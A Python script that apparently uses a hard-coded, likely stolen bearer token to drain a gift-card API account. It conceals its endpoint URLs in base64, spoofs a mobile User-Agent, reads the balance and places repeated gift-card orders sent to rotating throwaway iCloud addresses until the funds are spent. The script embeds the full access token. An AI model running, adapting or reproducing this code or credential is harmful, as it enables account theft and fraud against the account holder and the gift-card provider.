import requests
import time
import random
import string
import base64

def _obf_decode(obs_str: str) -> str:
    """Decode an obfuscated base64 string."""
    return base64.b64decode(obs_str).decode('utf-8')


_OBF_BALANCE_URL = "aHR0cHM6Ly9naWZ0Y2FyZHNyZWxvYWRseS5jb20vYWNjb3VudHMvYmFsYW5jZQ=="
_OBF_ORDER_URL = "aHR0cHM6Ly9naWZ0Y2FyZHNyZWxvYWRseS5jb20vb3JkZXJz"


_AUTH_TOKEN = "eyJraWQiOiI5MTYxZDA4Zi05ODhjLTRiYjItYTI5NS03ODc5NmQ2MzJlM2YiLCJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxNDY0NiIsImlzcyI6Imh0dHBzOi8vcmVsb2FkbHkuYXV0aDAuY29tLyIsImh0dHBzOi8vcmVsb2FkbHkuY29tL3NhbmRib3giOmZhbHNlLCJodHRwczovL3JlbG9hZGx5LmNvbS9wcmVwYWlkVXNlcklkIjoiMTQ2NDYiLCJndHkiOiJjbGllbnQtY3JlZGVudGlhbHMiLCJhdWQiOiJodHRwczovL2dpZnRjYXJkcy5yZWxvYWRseS5jb20iLCJuYmYiOjE3NDY4ODMzNTEsImF6cCI6IjE0NjQ2Iiwic2NvcGUiOiJkZXZlbG9wZXIiLCJleHAiOjE3NTIwNjczNTEsImh0dHBzOi8vcmVsb2FkbHkuY29tL2p0aSI6ImY0NWYxZWI5LWE3M2YtNDIwNS05YjQ1LWE5ZjhhMzE5NjgzZiIsImlhdCI6MTc0Njg4MzM1MSwianRpIjoiMGZjNzNiMmYtZTJmYi00NWUwLThmNzctY2ZlNzkxZTZlY2E4In0.pOZP_bdM8GcO8qadEpAbdMhfKyZ8ysJkfMdfJ3UFhes"

def random_id(length: int = 28) -> str:
    """Generate a random alphanumeric identifier."""
    chars = string.ascii_letters + string.digits
    return ''.join(random.choices(chars, k=length))

def check_balance() -> int:
    """Check account balance using obfuscated URL."""
    url = _obf_decode(_OBF_BALANCE_URL)
    headers = {
        'Accept': 'application/com.reloadly.giftcards-v1+json',
        'Accept-Encoding': 'text',
        'User-Agent': 'surveysui/246 CFNetwork/1410.1 Darwin/22.6.0',
        'Accept-Language': 'en-US,en;q=0.9',
        'Authorization': f'Bearer {_AUTH_TOKEN}'
    }
    try:
        resp = requests.get(url, headers=headers)
        resp.raise_for_status()
        data = resp.json()
        balance = data.get('balance', 0)
        print(f"Current balance: {balance}")
        return balance
    except Exception as ex:
        print(f"Error checking balance: {ex}")
        return 0

def place_order(amount: int) -> bool:
    """Place a gift card order using obfuscated URL."""
    url = _obf_decode(_OBF_ORDER_URL)
    headers = {
        'Accept': '/',
        'Content-Type': 'application/json',
        'Accept-Encoding': 'text',
        'Authorization': f'Bearer {_AUTH_TOKEN}'
    }
    emails = [
        "rafts.afield0h@icloud.com",
        "vernier.cantor-0x@icloud.com",
        "93past.binds@icloud.com",
        "cay.expos.0j@icloud.com",
        "05-pinhole-up@icloud.com"
    ]
    payload = {
        "senderName": " ",
        "quantity": 1,
        "unitPrice": amount,
        "recipientEmail": random.choice(emails),
        "productId": 14107,
        "countryCode": "US",
        "customIdentifier": random_id()
    }
    try:
        resp = requests.post(url, headers=headers, json=payload)
        print(f"Order response for ${amount}: {resp.status_code}")
        print(f"Response: {resp.text}")
        time.sleep(5)
        return resp.status_code == 200
    except Exception as ex:
        print(f"Error placing order for ${amount}: {ex}")
        return False

def calculate_orders(balance: int) -> list[int]:
    """Calculate optimal order amounts based on balance."""
    orders = []
    remaining = balance
    while remaining >= 100:
        orders.append(100)
        remaining -= 100
    if remaining >= 30:
        orders.append(remaining)
    return orders

def main():
    print("=== Balance Monitor Started ===")
    balance = check_balance()
    if balance <= 30:
        print(f"Balance {balance} is not greater than 30. Exiting.")
        return
    print(f"Balance {balance} is sufficient. Calculating orders...")
    orders = calculate_orders(balance)
    print(f"Planned orders: {orders}")
    successes = 0
    for idx, amt in enumerate(orders, 1):
        print(f"Placing order {idx}/{len(orders)} for ${amt}...")
        if place_order(amt):
            successes += 1
            print(f"Order {idx} successful!")
        else:
            print(f"Order {idx} failed!")
        if idx < len(orders):
            print("Waiting 5 seconds before next order...")
            time.sleep(5)
    print(f"Completed {successes}/{len(orders)} orders successfully")
    print("Checking final balance...")
    time.sleep(2)
    final = check_balance()
    print(f"Final balance: {final}")
    print("=== Script completed ===")

if __name__ == "__main__":
    main()
